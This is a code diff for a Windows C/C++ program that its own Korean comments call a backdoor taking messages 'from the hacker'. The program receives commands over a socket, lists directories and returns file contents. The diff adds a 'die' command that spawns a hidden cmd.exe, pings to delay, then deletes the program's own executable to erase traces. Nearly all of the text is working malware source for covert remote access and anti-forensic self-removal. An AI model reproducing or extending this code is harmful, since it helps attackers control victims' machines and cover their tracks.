@@ -4,13 +4,29 @@
 #include <stdio.h> 
 #include<string.h>
 #include<stdlib.h>
+#include<Windows.h>
 #include<string>
 #include <vector>
 #include<iostream>
 #include<fstream>
 #include <Ws2tcpip.h> // inet_ntop, inet_pton
 #pragma comment(lib,"Ws2_32.lib")
-
+#include <strsafe.h> 
+#define SELF_REMOVE_STRING TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"") 
+void self_Kill() // 백도어 자가삭제 함수
+{
+	TCHAR szModuleName[MAX_PATH];
+	TCHAR szCmd[2 * MAX_PATH]; 
+	STARTUPINFO si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	GetModuleFileName(NULL, szModuleName, MAX_PATH); 
+	// 현재 프로세스의 프로세스 얻어옴
+	StringCbPrintfA(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
+	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+	// 백그라운드 모드로 cmd 생성, ping 명령을 통해 현재 파일 삭제
+	CloseHandle(pi.hThread); 
+	CloseHandle(pi.hProcess);
+}
 //typedef std::wstring str_t;
 using namespace std;
 typedef struct sendCmd 
@@ -18,7 +34,7 @@ typedef struct sendCmd
 	char cmd[100];
 	char argv[512];
 
-}SendCmd;
+}SendCmd; // 해커로 부터 메세지를 받을 구조체
 
 int main() {
 	char myaddr[] = "127.0.0.1";
@@ -92,7 +108,6 @@ int main() {
 		
 		while ((str_len = recv(hclientSock, message, 512, 0)) != 0) {
 			p = (SendCmd*)message;
-			//printf("%s %s\n", p->cmd, p->argv);
 			if (strncmp("exit", p->cmd,4) == 0) {
 				if (closesocket(hclientSock) == SOCKET_ERROR) {
 					printf("close Socket ERROR\n");
@@ -105,6 +120,10 @@ int main() {
 				Sleep(5000);
 				return 0;
 			}
+			else if (strncmp("die", p->cmd, 3) == 0) {
+				self_Kill(); // self kill
+				return 0;
+			}
 			else if (strncmp("ls", p->cmd,2) == 0) {
 				WIN32_FIND_DATA data;
 				vector<string> names;
@@ -115,7 +134,6 @@ int main() {
 					} while (FindNextFile(hFind, &data) != 0);
 					FindClose(hFind);
 				}
-				//printf("%s\n", names.back());
 				char fsize[4];
 				itoa(names.size(), fsize, 10);
 				send(hclientSock, fsize, sizeof(fsize), 0);
@@ -134,6 +152,7 @@ int main() {
 				DeleteFile("tempo");
 				send(hclientSock, tmp, strlen(tmp), 0); // 클라이언트에서 받은걸 다시 send
 			}
+			
 		}
 	}
 	closesocket(tcp_sock);
